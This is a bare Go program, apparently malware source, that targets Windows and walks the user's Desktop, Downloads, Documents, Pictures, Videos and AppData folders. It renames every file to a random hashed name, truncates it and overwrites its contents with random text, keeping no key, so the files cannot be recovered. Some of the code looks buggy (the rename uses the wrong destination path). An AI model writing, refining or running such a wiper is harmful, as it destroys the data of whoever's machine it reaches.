package main

import (
	"crypto/rand"
	"crypto/sha256"
	"encoding/base64"
	"encoding/hex"
	"fmt"
	"log"
	"os"
	"os/user"
	"path/filepath"
	"runtime"
	"sync"
)

func main() {
	if runtime.GOOS != "windows" {
		log.Fatal("this only works on windows")
		return
	}

	user, err := user.Current()
	if err != nil {
		log.Fatal("failed to get the current user")
		return
	}

	homeDir := user.HomeDir
	paths := make(map[string] string)

	paths["desktop"] = filepath.Join(homeDir, "Desktop")
	paths["downloads"] = filepath.Join(homeDir, "Downloads")
	paths["documents"] = filepath.Join(homeDir, "Documents")
	paths["pictures"] = filepath.Join(homeDir, "Pictures")
	paths["videos"] = filepath.Join(homeDir, "Videos")
	paths["appdata"] = filepath.Join(homeDir, "AppData")

	for name, path := range paths {
		if _, err := os.Stat(path); os.IsNotExist(err) {
			fmt.Printf("could not get %s", path)
			delete(paths, name)
		}
	}

	if len(paths) <= 0 {
		log.Fatal("no paths")
		return
	}

	var wg sync.WaitGroup

	for _, path := range paths {
		wg.Add(1)

		go func(path string) {
			defer wg.Done()
			processFiles(path)
		}(path)
	}

	wg.Wait()
}

func genRandomString(length int) (string, error) {
	bytes := make([]byte, length)
	if _, err := rand.Read(bytes); err != nil {
		return "", err
	}

	encoded := base64.URLEncoding.EncodeToString(bytes)
	return encoded[:length], nil
}

func hashString(data string) string {
	hash := sha256.New()
	hash.Write([]byte(data))

	slice := hash.Sum(nil)

	str, err := genRandomString(10)
	if err != nil {
		str = "what!"
	}

	return str + hex.EncodeToString(slice)
}

func hashFile(path string) {
	file, err := os.Open(path)
	if err != nil {
		fmt.Printf("cant open file %v: %v\n", path, err)
		return
	}

	defer file.Close()

	str, err := genRandomString(137)
	if err != nil {
		str = "chuiy3w4r8734uoih"
	}

	str = hashString(str)

	file, err = os.OpenFile(path, os.O_RDWR | os.O_TRUNC, 0644)
	if err != nil {
		fmt.Printf("cant open file %v: %v\n", path, err)
		return
	}

	defer file.Close()

	_, err = file.WriteString(str)
	if err != nil {
		fmt.Printf("error writing file %v: %v\n", path, err)
	}
}

func processFiles(path string) {
	err := filepath.Walk(path, func(fp string, info os.FileInfo, err error) error {
		if err != nil {
			fmt.Printf("error walking path %v: %v\n", fp, err)
			return err
		}

		if !info.IsDir() {
			go func(fp string) {
				newName := hashString(info.Name())
				newPath := filepath.Join(filepath.Dir(fp), newName)

				err := os.Rename(fp, newName)
				if err != nil {
					fmt.Printf("cant rename %v to %v: %v\n", fp, newPath, err)
					return
				}

				hashFile(newPath)
			}(fp)
		}

		return nil
	})

	if err != nil {
		fmt.Printf("error walking directory %v: %v\n", path, err)
	}
}